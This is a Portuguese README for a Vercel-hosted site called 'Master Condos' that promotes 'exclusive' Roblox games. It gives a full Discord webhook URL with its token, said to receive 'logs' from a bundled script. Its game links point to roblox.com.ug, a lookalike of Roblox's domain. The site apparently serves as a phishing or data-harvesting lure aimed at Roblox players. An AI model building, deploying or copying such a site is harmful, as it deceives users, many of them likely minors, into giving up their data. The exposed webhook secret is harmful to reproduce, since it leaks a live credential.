# Master Condos

Um site moderno para jogos exclusivos do Roblox com integração de webhook para logs.

## 📋 Características

- **Design Responsivo**: Interface moderna com cores vermelhas
- **Jogos em Destaque**: Exibição de 4 jogos exclusivos do Roblox
- **Webhook Discord**: Integração automática de logs
- **Otimizado para Vercel**: Pronto para hospedagem em produção

## 🚀 Deployment no Vercel

### Opção 1: Via GitHub (Recomendado)

1. Conecte seu repositório GitHub ao Vercel
2. Selecione este repositório
3. Clique em "Deploy"
4. O Vercel fará o deploy automático

### Opção 2: Via CLI

```bash
npm install -g vercel
vercel
```

## 📁 Estrutura de Arquivos

```
mastercondos/
├── index.html              # Página principal
├── assets/                 # CSS, JS e imagens compiladas
├── theme-override.css      # Estilos personalizados
├── favicon.svg             # Ícone do site
├── click-sound.mp3         # Som de clique
├── overlay.js              # Scripts adicionais
├── package.json            # Dependências
├── vercel.json             # Configuração Vercel
└── README.md               # Este arquivo
```

## 🔧 Configuração

### Webhook Discord

O webhook está configurado em `assets/index-EMoPcdfT.js` para enviar logs para:
```
https://discord.com/api/webhooks/1515847249597431929/jMYzK0DFDhc8FdpgMP8304_XNYmztefsQ8w9i8S-IDShWwEl_SLV1y2Skwd_DmG0aYqm
```

### Links dos Jogos

Os links dos jogos estão configurados para:
```
https://roblox.com.ug/games/15884350761/UPDATE-Bloody-Ragdoll-Engine-Remastered?privateServerLinkCode=36222072360632783707895993359447
```

## 🎨 Personalização

- **Cores**: Edite `theme-override.css` para mudar o esquema de cores
- **Conteúdo**: Modifique `assets/index-EMoPcdfT.js` para alterar textos e links
- **Imagens**: Substitua as imagens em `assets/`

## 📝 Licença

MIT

## 👨‍💻 Desenvolvido por

Master Condos Team
